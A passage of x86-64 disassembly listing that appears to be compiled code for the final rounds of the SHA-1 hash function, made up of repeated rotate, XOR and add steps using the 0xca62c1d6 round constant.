  4068f3:	48 c1 e8 02          	shr    $0x2,%rax
  4068f7:	48 09 d0             	or     %rdx,%rax
  4068fa:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  406901:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
  406905:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  406909:	48 31 c2             	xor    %rax,%rdx
  40690c:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  406910:	48 31 c2             	xor    %rax,%rdx
  406913:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  406917:	48 31 d0             	xor    %rdx,%rax
  40691a:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406921:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406928:	48 c1 e0 05          	shl    $0x5,%rax
  40692c:	48 89 c2             	mov    %rax,%rdx
  40692f:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406936:	89 c0                	mov    %eax,%eax
  406938:	48 c1 e8 1b          	shr    $0x1b,%rax
  40693c:	48 89 d1             	mov    %rdx,%rcx
  40693f:	48 09 c1             	or     %rax,%rcx
  406942:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406949:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  406950:	48 31 d0             	xor    %rdx,%rax
  406953:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  40695a:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  40695e:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406965:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406969:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406970:	89 c0                	mov    %eax,%eax
  406972:	48 c1 e8 1f          	shr    $0x1f,%rax
  406976:	48 09 c8             	or     %rcx,%rax
  406979:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  40697d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  406981:	48 01 c2             	add    %rax,%rdx
  406984:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40698b:	48 01 c2             	add    %rax,%rdx
  40698e:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406993:	48 01 d0             	add    %rdx,%rax
  406996:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40699d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4069a4:	48 c1 e0 1e          	shl    $0x1e,%rax
  4069a8:	48 89 c2             	mov    %rax,%rdx
  4069ab:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4069b2:	89 c0                	mov    %eax,%eax
  4069b4:	48 c1 e8 02          	shr    $0x2,%rax
  4069b8:	48 09 d0             	or     %rdx,%rax
  4069bb:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4069c2:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  4069c6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4069ca:	48 31 c2             	xor    %rax,%rdx
  4069cd:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4069d1:	48 31 c2             	xor    %rax,%rdx
  4069d4:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  4069d8:	48 31 d0             	xor    %rdx,%rax
  4069db:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4069e2:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4069e9:	48 c1 e0 05          	shl    $0x5,%rax
  4069ed:	48 89 c2             	mov    %rax,%rdx
  4069f0:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4069f7:	89 c0                	mov    %eax,%eax
  4069f9:	48 c1 e8 1b          	shr    $0x1b,%rax
  4069fd:	48 89 d1             	mov    %rdx,%rcx
  406a00:	48 09 c1             	or     %rax,%rcx
  406a03:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406a0a:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  406a11:	48 31 d0             	xor    %rdx,%rax
  406a14:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  406a1b:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406a1f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406a26:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406a2a:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406a31:	89 c0                	mov    %eax,%eax
  406a33:	48 c1 e8 1f          	shr    $0x1f,%rax
  406a37:	48 09 c8             	or     %rcx,%rax
  406a3a:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  406a3e:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  406a42:	48 01 c2             	add    %rax,%rdx
  406a45:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406a4c:	48 01 c2             	add    %rax,%rdx
  406a4f:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406a54:	48 01 d0             	add    %rdx,%rax
  406a57:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  406a5e:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406a65:	48 c1 e0 1e          	shl    $0x1e,%rax
  406a69:	48 89 c2             	mov    %rax,%rdx
  406a6c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406a73:	89 c0                	mov    %eax,%eax
  406a75:	48 c1 e8 02          	shr    $0x2,%rax
  406a79:	48 09 d0             	or     %rdx,%rax
  406a7c:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  406a83:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
  406a87:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  406a8b:	48 31 c2             	xor    %rax,%rdx
  406a8e:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  406a92:	48 31 c2             	xor    %rax,%rdx
  406a95:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  406a99:	48 31 d0             	xor    %rdx,%rax
  406a9c:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406aa3:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406aaa:	48 c1 e0 05          	shl    $0x5,%rax
  406aae:	48 89 c2             	mov    %rax,%rdx
  406ab1:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406ab8:	89 c0                	mov    %eax,%eax
  406aba:	48 c1 e8 1b          	shr    $0x1b,%rax
  406abe:	48 89 d1             	mov    %rdx,%rcx
  406ac1:	48 09 c1             	or     %rax,%rcx
  406ac4:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406acb:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  406ad2:	48 31 d0             	xor    %rdx,%rax
  406ad5:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  406adc:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406ae0:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406ae7:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406aeb:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406af2:	89 c0                	mov    %eax,%eax
  406af4:	48 c1 e8 1f          	shr    $0x1f,%rax
  406af8:	48 09 c8             	or     %rcx,%rax
  406afb:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  406aff:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  406b03:	48 01 c2             	add    %rax,%rdx
  406b06:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406b0d:	48 01 c2             	add    %rax,%rdx
  406b10:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406b15:	48 01 d0             	add    %rdx,%rax
  406b18:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  406b1f:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406b26:	48 c1 e0 1e          	shl    $0x1e,%rax
  406b2a:	48 89 c2             	mov    %rax,%rdx
  406b2d:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406b34:	89 c0                	mov    %eax,%eax
  406b36:	48 c1 e8 02          	shr    $0x2,%rax
  406b3a:	48 09 d0             	or     %rdx,%rax
  406b3d:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  406b44:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
  406b48:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  406b4c:	48 31 c2             	xor    %rax,%rdx
  406b4f:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  406b53:	48 31 c2             	xor    %rax,%rdx
  406b56:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  406b5a:	48 31 d0             	xor    %rdx,%rax
  406b5d:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406b64:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406b6b:	48 c1 e0 05          	shl    $0x5,%rax
  406b6f:	48 89 c2             	mov    %rax,%rdx
  406b72:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406b79:	89 c0                	mov    %eax,%eax
  406b7b:	48 c1 e8 1b          	shr    $0x1b,%rax
  406b7f:	48 89 d1             	mov    %rdx,%rcx
  406b82:	48 09 c1             	or     %rax,%rcx
  406b85:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406b8c:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  406b93:	48 31 d0             	xor    %rdx,%rax
  406b96:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  406b9d:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406ba1:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406ba8:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406bac:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406bb3:	89 c0                	mov    %eax,%eax
  406bb5:	48 c1 e8 1f          	shr    $0x1f,%rax
  406bb9:	48 09 c8             	or     %rcx,%rax
  406bbc:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  406bc0:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  406bc4:	48 01 c2             	add    %rax,%rdx
  406bc7:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406bce:	48 01 c2             	add    %rax,%rdx
  406bd1:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406bd6:	48 01 d0             	add    %rdx,%rax
  406bd9:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  406be0:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406be7:	48 c1 e0 1e          	shl    $0x1e,%rax
  406beb:	48 89 c2             	mov    %rax,%rdx
  406bee:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406bf5:	89 c0                	mov    %eax,%eax
  406bf7:	48 c1 e8 02          	shr    $0x2,%rax
  406bfb:	48 09 d0             	or     %rdx,%rax
  406bfe:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  406c05:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  406c09:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  406c0d:	48 31 c2             	xor    %rax,%rdx
  406c10:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  406c14:	48 31 c2             	xor    %rax,%rdx
  406c17:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  406c1b:	48 31 d0             	xor    %rdx,%rax
  406c1e:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406c25:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406c2c:	48 c1 e0 05          	shl    $0x5,%rax
  406c30:	48 89 c2             	mov    %rax,%rdx
  406c33:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406c3a:	89 c0                	mov    %eax,%eax
  406c3c:	48 c1 e8 1b          	shr    $0x1b,%rax
  406c40:	48 89 d1             	mov    %rdx,%rcx
  406c43:	48 09 c1             	or     %rax,%rcx
  406c46:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406c4d:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  406c54:	48 31 d0             	xor    %rdx,%rax
  406c57:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  406c5e:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406c62:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406c69:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406c6d:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406c74:	89 c0                	mov    %eax,%eax
  406c76:	48 c1 e8 1f          	shr    $0x1f,%rax
  406c7a:	48 09 c8             	or     %rcx,%rax
  406c7d:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  406c81:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  406c85:	48 01 c2             	add    %rax,%rdx
  406c88:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406c8f:	48 01 c2             	add    %rax,%rdx
  406c92:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406c97:	48 01 d0             	add    %rdx,%rax
  406c9a:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  406ca1:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406ca8:	48 c1 e0 1e          	shl    $0x1e,%rax
  406cac:	48 89 c2             	mov    %rax,%rdx
  406caf:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406cb6:	89 c0                	mov    %eax,%eax
  406cb8:	48 c1 e8 02          	shr    $0x2,%rax
  406cbc:	48 09 d0             	or     %rdx,%rax
  406cbf:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  406cc6:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  406cca:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  406cce:	48 31 c2             	xor    %rax,%rdx
  406cd1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  406cd5:	48 31 c2             	xor    %rax,%rdx
  406cd8:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  406cdc:	48 31 d0             	xor    %rdx,%rax
  406cdf:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406ce6:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406ced:	48 c1 e0 05          	shl    $0x5,%rax
  406cf1:	48 89 c2             	mov    %rax,%rdx
  406cf4:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406cfb:	89 c0                	mov    %eax,%eax
  406cfd:	48 c1 e8 1b          	shr    $0x1b,%rax
  406d01:	48 89 d1             	mov    %rdx,%rcx
  406d04:	48 09 c1             	or     %rax,%rcx
  406d07:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406d0e:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  406d15:	48 31 d0             	xor    %rdx,%rax
  406d18:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  406d1f:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406d23:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406d2a:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406d2e:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406d35:	89 c0                	mov    %eax,%eax
  406d37:	48 c1 e8 1f          	shr    $0x1f,%rax
  406d3b:	48 09 c8             	or     %rcx,%rax
  406d3e:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  406d42:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  406d46:	48 01 c2             	add    %rax,%rdx
  406d49:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406d50:	48 01 c2             	add    %rax,%rdx
  406d53:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406d58:	48 01 d0             	add    %rdx,%rax
  406d5b:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  406d62:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406d69:	48 c1 e0 1e          	shl    $0x1e,%rax
  406d6d:	48 89 c2             	mov    %rax,%rdx
  406d70:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406d77:	89 c0                	mov    %eax,%eax
  406d79:	48 c1 e8 02          	shr    $0x2,%rax
  406d7d:	48 09 d0             	or     %rdx,%rax
  406d80:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  406d87:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
  406d8b:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  406d8f:	48 31 c2             	xor    %rax,%rdx
  406d92:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  406d96:	48 31 c2             	xor    %rax,%rdx
  406d99:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  406d9d:	48 31 d0             	xor    %rdx,%rax
  406da0:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406da7:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406dae:	48 c1 e0 05          	shl    $0x5,%rax
  406db2:	48 89 c2             	mov    %rax,%rdx
  406db5:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406dbc:	89 c0                	mov    %eax,%eax
  406dbe:	48 c1 e8 1b          	shr    $0x1b,%rax
  406dc2:	48 89 d1             	mov    %rdx,%rcx
  406dc5:	48 09 c1             	or     %rax,%rcx
  406dc8:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406dcf:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  406dd6:	48 31 d0             	xor    %rdx,%rax
  406dd9:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  406de0:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406de4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406deb:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406def:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406df6:	89 c0                	mov    %eax,%eax
  406df8:	48 c1 e8 1f          	shr    $0x1f,%rax
  406dfc:	48 09 c8             	or     %rcx,%rax
  406dff:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  406e03:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  406e07:	48 01 c2             	add    %rax,%rdx
  406e0a:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406e11:	48 01 c2             	add    %rax,%rdx
  406e14:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406e19:	48 01 d0             	add    %rdx,%rax
  406e1c:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  406e23:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406e2a:	48 c1 e0 1e          	shl    $0x1e,%rax
  406e2e:	48 89 c2             	mov    %rax,%rdx
  406e31:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406e38:	89 c0                	mov    %eax,%eax
  406e3a:	48 c1 e8 02          	shr    $0x2,%rax
  406e3e:	48 09 d0             	or     %rdx,%rax
  406e41:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  406e48:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  406e4c:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  406e50:	48 31 c2             	xor    %rax,%rdx
  406e53:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  406e57:	48 31 c2             	xor    %rax,%rdx
  406e5a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  406e5e:	48 31 d0             	xor    %rdx,%rax
  406e61:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406e68:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406e6f:	48 c1 e0 05          	shl    $0x5,%rax
  406e73:	48 89 c2             	mov    %rax,%rdx
  406e76:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406e7d:	89 c0                	mov    %eax,%eax
  406e7f:	48 c1 e8 1b          	shr    $0x1b,%rax
  406e83:	48 89 d1             	mov    %rdx,%rcx
  406e86:	48 09 c1             	or     %rax,%rcx
  406e89:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  406e90:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  406e97:	48 31 d0             	xor    %rdx,%rax
  406e9a:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  406ea1:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406ea5:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406eac:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406eb0:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406eb7:	89 c0                	mov    %eax,%eax
  406eb9:	48 c1 e8 1f          	shr    $0x1f,%rax
  406ebd:	48 09 c8             	or     %rcx,%rax
  406ec0:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  406ec4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  406ec8:	48 01 c2             	add    %rax,%rdx
  406ecb:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406ed2:	48 01 c2             	add    %rax,%rdx
  406ed5:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406eda:	48 01 d0             	add    %rdx,%rax
  406edd:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  406ee4:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406eeb:	48 c1 e0 1e          	shl    $0x1e,%rax
  406eef:	48 89 c2             	mov    %rax,%rdx
  406ef2:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406ef9:	89 c0                	mov    %eax,%eax
  406efb:	48 c1 e8 02          	shr    $0x2,%rax
  406eff:	48 09 d0             	or     %rdx,%rax
  406f02:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  406f09:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  406f0d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  406f11:	48 31 c2             	xor    %rax,%rdx
  406f14:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  406f18:	48 31 c2             	xor    %rax,%rdx
  406f1b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  406f1f:	48 31 d0             	xor    %rdx,%rax
  406f22:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406f29:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406f30:	48 c1 e0 05          	shl    $0x5,%rax
  406f34:	48 89 c2             	mov    %rax,%rdx
  406f37:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  406f3e:	89 c0                	mov    %eax,%eax
  406f40:	48 c1 e8 1b          	shr    $0x1b,%rax
  406f44:	48 89 d1             	mov    %rdx,%rcx
  406f47:	48 09 c1             	or     %rax,%rcx
  406f4a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  406f51:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  406f58:	48 31 d0             	xor    %rdx,%rax
  406f5b:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  406f62:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406f66:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406f6d:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  406f71:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406f78:	89 c0                	mov    %eax,%eax
  406f7a:	48 c1 e8 1f          	shr    $0x1f,%rax
  406f7e:	48 09 c8             	or     %rcx,%rax
  406f81:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  406f85:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  406f89:	48 01 c2             	add    %rax,%rdx
  406f8c:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406f93:	48 01 c2             	add    %rax,%rdx
  406f96:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  406f9b:	48 01 d0             	add    %rdx,%rax
  406f9e:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  406fa5:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406fac:	48 c1 e0 1e          	shl    $0x1e,%rax
  406fb0:	48 89 c2             	mov    %rax,%rdx
  406fb3:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406fba:	89 c0                	mov    %eax,%eax
  406fbc:	48 c1 e8 02          	shr    $0x2,%rax
  406fc0:	48 09 d0             	or     %rdx,%rax
  406fc3:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  406fca:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  406fce:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  406fd2:	48 31 c2             	xor    %rax,%rdx
  406fd5:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  406fd9:	48 31 c2             	xor    %rax,%rdx
  406fdc:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  406fe0:	48 31 d0             	xor    %rdx,%rax
  406fe3:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  406fea:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406ff1:	48 c1 e0 05          	shl    $0x5,%rax
  406ff5:	48 89 c2             	mov    %rax,%rdx
  406ff8:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406fff:	89 c0                	mov    %eax,%eax
  407001:	48 c1 e8 1b          	shr    $0x1b,%rax
  407005:	48 89 d1             	mov    %rdx,%rcx
  407008:	48 09 c1             	or     %rax,%rcx
  40700b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  407012:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  407019:	48 31 d0             	xor    %rdx,%rax
  40701c:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  407023:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  407027:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40702e:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  407032:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  407039:	89 c0                	mov    %eax,%eax
  40703b:	48 c1 e8 1f          	shr    $0x1f,%rax
  40703f:	48 09 c8             	or     %rcx,%rax
  407042:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  407046:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40704a:	48 01 c2             	add    %rax,%rdx
  40704d:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  407054:	48 01 c2             	add    %rax,%rdx
  407057:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  40705c:	48 01 d0             	add    %rdx,%rax
  40705f:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  407066:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40706d:	48 c1 e0 1e          	shl    $0x1e,%rax
  407071:	48 89 c2             	mov    %rax,%rdx
  407074:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40707b:	89 c0                	mov    %eax,%eax
  40707d:	48 c1 e8 02          	shr    $0x2,%rax
  407081:	48 09 d0             	or     %rdx,%rax
  407084:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  40708b:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  40708f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  407093:	48 31 c2             	xor    %rax,%rdx
  407096:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  40709a:	48 31 c2             	xor    %rax,%rdx
  40709d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4070a1:	48 31 d0             	xor    %rdx,%rax
  4070a4:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4070ab:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4070b2:	48 c1 e0 05          	shl    $0x5,%rax
  4070b6:	48 89 c2             	mov    %rax,%rdx
  4070b9:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4070c0:	89 c0                	mov    %eax,%eax
  4070c2:	48 c1 e8 1b          	shr    $0x1b,%rax
  4070c6:	48 89 d1             	mov    %rdx,%rcx
  4070c9:	48 09 c1             	or     %rax,%rcx
  4070cc:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4070d3:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4070da:	48 31 d0             	xor    %rdx,%rax
  4070dd:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  4070e4:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4070e8:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4070ef:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4070f3:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
